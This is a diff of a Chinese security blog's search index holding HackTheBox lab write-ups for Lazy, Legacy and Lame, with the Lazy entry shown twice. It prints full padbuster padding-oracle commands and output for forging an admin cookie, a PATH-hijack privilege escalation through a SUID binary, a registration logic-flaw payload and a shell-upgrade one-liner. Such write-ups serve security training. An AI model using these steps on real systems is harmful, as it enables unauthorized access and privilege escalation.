+    <content><![CDATA[<h1 id="Lazy"><a href="#Lazy" class="headerlink" title="Lazy"></a>Lazy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lazy/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Lazy/5.png" alt="5"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-oracle-padding-attack"><a href="#方法1-oracle-padding-attack" class="headerlink" title="方法1 oracle padding attack"></a>方法1 oracle padding attack</h3><p>尝试注册用户admin，提示用户已经存在，随便注册个账号进去看看</p>
+<p><img src="/images/Lazy/6.png" alt="6"></p>
+<p>啥也没有，但是发现了一个奇怪的地方</p>
+<p>在index.php处cookie提交了一个auth参数</p>
+<p><img src="/images/Lazy/7.png" alt="7"></p>
+<p>如果修改cookie</p>
+<p><img src="/images/Lazy/8.png" alt="8"></p>
+<p>得到<code>Invalid padding</code>，根据这些，可以找到一个经典的漏洞:oracle padding attack</p>
+<p>如果要理解过程，只需要理解一些基本的密码学知识:XOR，CBC加密和解密，PKCS #5，比特反转。然后google即可<br>这台机器的漏洞情况是，我们作为攻击者，知道了明文所构造的密文，并且能够触发解密过程(服务器会对解密是否成功进行提示)，那么我们就可以在不知道密钥的情况下，解密任意明文或者构造任意明文的合法密文</p>
+<p>有一个工具padbuster可以进行利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 2 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">The following response signatures were returned:                                                                                                             </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">-------------------------------------------------------                                                                                                      </span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (93&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (20&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (118&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (230&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (151&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (47&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 37b56ca6e4f9d23a</span><br><span class="line">[+] Intermediate Bytes (HEX): f5d66f1f8e41eea2</span><br><span class="line">[+] Plain Text: user&#x3D;evi</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at &#x2F;usr&#x2F;bin&#x2F;padbuster line 361, &lt;STDIN&gt; line 1.</span><br><span class="line">*** Starting Block 2 of 2 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (25&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (147&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (75&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (173&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 9e08032a172b2184</span><br><span class="line">[+] Intermediate Bytes (HEX): 5bb26ba1e3fed53d</span><br><span class="line">[+] Plain Text: l</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): user&#x3D;evil</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 757365723D6576696C07070707070707</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): dXNlcj1ldmlsBwcHBwcHBw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>添加参数<code>-plaintext user=admin</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0 -plaintext user&#x3D;admin</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 2</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (148&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (218&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (136&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (150&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 23037825d5a1683b</span><br><span class="line">[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d</span><br><span class="line"></span><br><span class="line">[+] Success: (1&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (36&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (180&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (17&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (146&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (50&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (132&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (135&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 0408ad19d62eba93</span><br><span class="line">[+] Intermediate Bytes (HEX): 717bc86beb4fdefe</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到了cookie，尝试登录</p>
+<p><img src="/images/Lazy/9.png" alt="9"></p>
+<p>成功以admin登录，里面存在一个私钥文件，用户名为<code>mitsos</code></p>
+<p><img src="/images/Lazy/10.png" alt="10"></p>
+<p>这样就能获取shell</p>
+<p><img src="/images/Lazy/11.png" alt="11"></p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>简单粗暴，不过感觉是一个白盒漏洞，在注册页面注册时，注册账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>也是可以跳转到正确的<code>index.php</code></p>
+<p>这不是一个常规的sql注入，应该是一个逻辑漏洞，可以审计一波</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -r -i id_rsa mitsos@10.10.10.18:&#x2F;var&#x2F;www&#x2F;html &#x2F;root&#x2F;Desktop&#x2F;test</span><br></pre></td></tr></table></figure>
+
+<p>首先找到index.php处，发现页面显示的逻辑是强类型比较<code>$user</code></p>
+<p><img src="/images/Lazy/2.png" alt="2"></p>
+<p><code>$user</code>变量在<code>header.php</code>处定义，使用了函数<code>getuserfromcookie</code></p>
+<p><img src="/images/Lazy/3.png" alt="3"></p>
+<p>找到<code>getuserfromcookie</code>函数，发现了漏洞</p>
+<p><img src="/images/Lazy/4.png" alt="4"></p>
+<p>这里<code>$user</code>赋予了用户名，<code>$data</code>的值是<code>user=admin=</code>，但是<code>explode(&quot;=&quot;,.....)</code>转成数组的时候，消掉了多出的<code>=</code>，造成了逻辑漏洞</p>
+<p>此时<code>$a</code>的值是user，<code>$user</code>的值是admin</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现SUID文件backup，运行可以查看<code>/etc/shadow</code></p>
+<p><img src="/images/Lazy/12.png" alt="12"></p>
+<p>ltrace查看，看来是直接通过PATH运行了cat命令</p>
+<p><img src="/images/Lazy/13.png" alt="13"></p>
+<p>PATH劫持提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;cat</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;home&#x2F;mitsos&#x2F;backup</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Lazy/14.png" alt="14"></p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:Legacy</title>
+    <url>/2020/06/04/HTB-Legacy/</url>
+    <content><![CDATA[<h1 id="Legacy"><a href="#Legacy" class="headerlink" title="Legacy"></a>Legacy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Legacy/1.jpg" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Legacy/2.jpg" alt="2"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><p><img src="/images/Legacy/3.jpg" alt="3"></p>
+<p>该漏洞有时候会利用失败，并导致服务崩溃，多重启2~3次即可</p>
+<p>至此我们已取得<code>system</code>权限</p>
+<p><img src="/images/Legacy/4.jpg" alt="4"></p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Windows靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:LaCasaDePapel</title>
     <url>/2020/06/29/HTB-LaCasaDePapel/</url>
     <content><![CDATA[<h1 id="LaCasaDePapel"><a href="#LaCasaDePapel" class="headerlink" title="LaCasaDePapel"></a>LaCasaDePapel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/LaCasaDePapel/1.jpg" alt="1"></p>
@@ -3151,130 +3225,6 @@
       </categories>
       <tags>
         <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Laboratory</title>
-    <url>/2021/02/09/HTB-Laboratory/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="b9a7ffa64d1b8b5666575e47e4d718b88fb0c9952ab5b49720a900797bbf5a4d">6b83b1484c1bd4d3cb7f0b3881091a917e82162c1010b073de7b97f343becdb3711cf2fb7aff6959fd2e9b5c0d3d367d764be4bc55138d1e7549242a24096e939938285a1e1bf45689a869c0c3ffedf91156a33ca563286439974bd3452882de7553a8f774e6022c8738a070ff57bc422fe9d5e5d379549148b3c32c6aaa757bc72cb897b196e320aae53ca6ba3a06cf8f6ec966b523ce10808da12db4f3621749a3d76c50961670d75ce05e7a91cdafa3e5f1b1dd411f97314cea06b4b123ef4fb60e22e41bfafad4bc1afa7859dd046fbb8bf7ba1ff9d0003fa1a5905b4e53ae390ae9de97d8d1c32d61eea079a86406793ce9e5e2f6989e7e027789a881896b50d36308e3d3a2fd25e3cba060cf8d215a65a9d94cb008454d24a20ebb22e567907bae02e5c647c2b9a22ede00652293f52b353770ddc819bd87896e740fe68a9cf1ec58e9e319547c048a50f46cba0f436bc9f8dc17b7fd0a67b7065219f172803c1f601cc66ca277f81b0750f0f5fc65317a8ca92063a1713b11e633388d009ef876f7c777233881246b15b0c2eed9c0b9f307682671f2801cb2baf6b3f83ddf19f89d92e2bb0e6ff74839334b6c9c537f9c2ee64ab85ada825eb07491b95491c971c0aed44d137ede6847ed60698d69db44b406e15022a3375e65d2c4fe82e58f67bdbec01c843a659cae61c3a167fd0f43bb9e32d817c44ea4fdc1438c85bea631c7ed611cd60006efb9d8406ff3c799d0ae427a8b496277b14ac572ede248d70974b8098a43c8438e63e98b9709122442972a04e1bec9378a6100a12dfa12848c530a7b387b7690bbc06ac8c9ff8b74ad922c274b0a14a8c3da9897696f7398c74d1fa91e1f340f98cfdee6a5787ade20d11052b1e7973bb5cba05371c2d7758064b3a6d41dd092775053e9be0e9797050d3f63c05776c3e32ba6a14d9efc69a6390bb642ecba8b3a61ec00876e954edf428455940a74d649a68114417221d8f45207b1d00efb5acd4ec1de53b27b6f53a31bb870c8c774c355ab3eec1317cf5fafda7c10888b04cb7d0eec5f9d16f449d015f2dfeb6ed13d59c2ac8b1e2f3fac4403abda465d74e3fb0cfef8ce8ecd434deea7ba557739c4f68f550042209fd3e535f98e3eb7118ddaa1b604eaa9ccdcaf7e22c55a5621b93678858d7b6b182afa5fb8f335e69ae09c1af5e3228de16ec16a167a9c2923cecdedafd684d85ac75bce972180760af4f9ec26ac337ea834083bfbc9f550e1ffc898733ce7a0f1bbaf94d77c6797b86b411e01319d5f04b366c8515e107c8b14187840a76c339fbdd87dcd9128da09cb20177a1bce3788a01d816b0e6aa12509fde53b5bd07653d7a3f5700143ca20aa3549de079125eb096e35db673a4ef35d2b0ce6cab8a5632ec6c9f6fcae7509b91d3e5149e28361595f12235c5385ec6bd8f84f8002612c6489ef1464d9709413035449dc1fba7c41ecee8c1353e87615bb62eed25b343ea0144259fa3165a275b4ba513d03fbfe4c9144c2d3cc1e310cb1b4ee4f9fc172b988adf5301df1911038c46a1a61cb873ac4287d09b8f9258ef05d6b8845617af9448ccf266604edfcc91350a15e83724d02ff8da970fb8c71513e2606a0aef19600a3d7f8f4c2084c7c42b8f5be8cb20affe0e9c2e5266f3d9a2f49fa7a419c1505c03abd91a839ac0e272d45f874640589e88f07affdb7ca75783922fcd865d4b70a4aa812732621bb5505e78873d9e3d6b1caa675a30abfee8e633f04cebc906b0f49489901d891f0debdaf</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash($6...V0)</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Lame</title>
-    <url>/2020/06/04/HTB-Lame/</url>
-    <content><![CDATA[<h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lame/1.jpg" alt="1"></p>
-<p>vsftpd 2.3.4</p>
-<p>smb 3.0.20</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，不过目录没有任何发现</p>
-<p>smb没有发现可以查看的文件</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="版本漏洞"><a href="#版本漏洞" class="headerlink" title="版本漏洞"></a>版本漏洞</h3><p>根据服务vsftpd 2.3.4搜索漏洞</p>
-<p><img src="/images/Lame/2.jpg" alt="2"></p>
-<p>尝试使用该漏洞发现无法利用</p>
-<p>尝试查找smb版本漏洞</p>
-<p><img src="/images/Lame/3.jpg" alt="3"></p>
-<p>发现msf也有现成可以使用的exp</p>
-<p><img src="/images/Lame/4.jpg" alt="4"></p>
-<p>成功使用EXP，而且竟然获取了root权限</p>
-<p>最后升级交互式shell，获取flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Lame/5.jpg" alt="5"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Lazy</title>
-    <url>/2020/10/20/HTB-Lazy/</url>
-    <content><![CDATA[<h1 id="Lazy"><a href="#Lazy" class="headerlink" title="Lazy"></a>Lazy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Lazy/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Lazy/5.png" alt="5"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-oracle-padding-attack"><a href="#方法1-oracle-padding-attack" class="headerlink" title="方法1 oracle padding attack"></a>方法1 oracle padding attack</h3><p>尝试注册用户admin，提示用户已经存在，随便注册个账号进去看看</p>
-<p><img src="/images/Lazy/6.png" alt="6"></p>
-<p>啥也没有，但是发现了一个奇怪的地方</p>
-<p>在index.php处cookie提交了一个auth参数</p>
-<p><img src="/images/Lazy/7.png" alt="7"></p>
-<p>如果修改cookie</p>
-<p><img src="/images/Lazy/8.png" alt="8"></p>
-<p>得到<code>Invalid padding</code>，根据这些，可以找到一个经典的漏洞:oracle padding attack</p>
-<p>如果要理解过程，只需要理解一些基本的密码学知识:XOR，CBC加密和解密，PKCS #5，比特反转。然后google即可<br>这台机器的漏洞情况是，我们作为攻击者，知道了明文所构造的密文，并且能够触发解密过程(服务器会对解密是否成功进行提示)，那么我们就可以在不知道密钥的情况下，解密任意明文或者构造任意明文的合法密文</p>
-<p>有一个工具padbuster可以进行利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 of 2 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">The following response signatures were returned:                                                                                                             </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">-------------------------------------------------------                                                                                                      </span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (93&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (20&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (118&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (230&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (151&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (47&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] Cipher Text (HEX): 37b56ca6e4f9d23a</span><br><span class="line">[+] Intermediate Bytes (HEX): f5d66f1f8e41eea2</span><br><span class="line">[+] Plain Text: user&#x3D;evi</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $plainTextBytes in concatenation (.) or string at &#x2F;usr&#x2F;bin&#x2F;padbuster line 361, &lt;STDIN&gt; line 1.</span><br><span class="line">*** Starting Block 2 of 2 ***</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (3&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (25&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (147&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (75&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (173&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] Cipher Text (HEX): 9e08032a172b2184</span><br><span class="line">[+] Intermediate Bytes (HEX): 5bb26ba1e3fed53d</span><br><span class="line">[+] Plain Text: l</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (ASCII): user&#x3D;evil</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (HEX): 757365723D6576696C07070707070707</span><br><span class="line"></span><br><span class="line">[+] Decrypted value (Base64): dXNlcj1ldmlsBwcHBwcHBw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure>
-
-<p>添加参数<code>-plaintext user=admin</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#padbuster http:&#x2F;&#x2F;10.10.10.18&#x2F;login.php gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE 8 -cookies auth&#x3D;gKUKbbMkmMs3tWym5PnSOp4IAyoXKyGE -encoding 0 -plaintext user&#x3D;admin</span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line">[+] Status: 200</span><br><span class="line">[+] Location: N&#x2F;A</span><br><span class="line">[+] Content Length: 1486</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line">[+] Number of Blocks: 2</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#     Freq    Status  Length  Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1       1       200     1564    N&#x2F;A</span><br><span class="line">2 **    255     200     15      N&#x2F;A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line">[+] Success: (196&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (148&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (92&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (41&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (218&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (136&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (150&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (190&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 23037825d5a1683b</span><br><span class="line">[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d</span><br><span class="line"></span><br><span class="line">[+] Success: (1&#x2F;256) [Byte 8]</span><br><span class="line">[+] Success: (36&#x2F;256) [Byte 7]</span><br><span class="line">[+] Success: (180&#x2F;256) [Byte 6]</span><br><span class="line">[+] Success: (17&#x2F;256) [Byte 5]</span><br><span class="line">[+] Success: (146&#x2F;256) [Byte 4]</span><br><span class="line">[+] Success: (50&#x2F;256) [Byte 3]</span><br><span class="line">[+] Success: (132&#x2F;256) [Byte 2]</span><br><span class="line">[+] Success: (135&#x2F;256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 0408ad19d62eba93</span><br><span class="line">[+] Intermediate Bytes (HEX): 717bc86beb4fdefe</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>得到了cookie，尝试登录</p>
-<p><img src="/images/Lazy/9.png" alt="9"></p>
-<p>成功以admin登录，里面存在一个私钥文件，用户名为<code>mitsos</code></p>
-<p><img src="/images/Lazy/10.png" alt="10"></p>
-<p>这样就能获取shell</p>
-<p><img src="/images/Lazy/11.png" alt="11"></p>
-<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>简单粗暴，不过感觉是一个白盒漏洞，在注册页面注册时，注册账户</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;</span><br></pre></td></tr></table></figure>
-
-<p>也是可以跳转到正确的<code>index.php</code></p>
-<p>这不是一个常规的sql注入，应该是一个逻辑漏洞，可以审计一波</p>
